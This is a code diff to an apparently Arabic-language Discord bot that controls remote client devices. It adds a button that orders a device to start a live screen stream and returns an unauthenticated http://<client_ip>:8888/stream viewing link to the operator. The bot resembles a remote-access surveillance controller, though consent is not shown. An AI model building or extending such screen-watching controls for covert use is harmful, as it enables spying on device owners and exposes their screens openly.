@@ -335,7 +335,18 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Check running processes for {self.code}"):
                 await interaction.followup.send("📋 تم طلب قائمة البرامج النشطة، سيصلك ملف التقرير هنا خلال لحظات!", ephemeral=True)
 
-    @discord.ui.button(label="💬 إرسال رسالة منبثقة", style=discord.ButtonStyle.primary, custom_id="dev_act_msg", row=2)
+    @discord.ui.button(label="🔴 بدء البث الحي للشاشة", style=discord.ButtonStyle.danger, custom_id="dev_act_live", row=2)
+    async def live_stream_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            if "remote_live_stream" not in db: db["remote_live_stream"] = {}
+            db["remote_live_stream"][self.code] = {"id": str(int(time.time())), "port": 8888}
+            if save_db(db, sha, url, headers, f"Start live stream for {self.code}"):
+                client_ip = db.get("codes", {}).get(self.code, {}).get("ip", "IP_غير_معروف")
+                await interaction.followup.send(f"🔴 **تم تشغيل خادم البث الحي على جهاز العميل!**\n🌐 يمكنك فتح نافذة المشاهدة عبر الرابط التالي في المتصفح لديك:\n`http://{client_ip}:8888/stream`", ephemeral=True)
+
+    @discord.ui.button(label="💬 إرسال رسالة منبثقة", style=discord.ButtonStyle.primary, custom_id="dev_act_msg", row=3)
     async def send_msg_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(SendMsgModal(self.code))
 
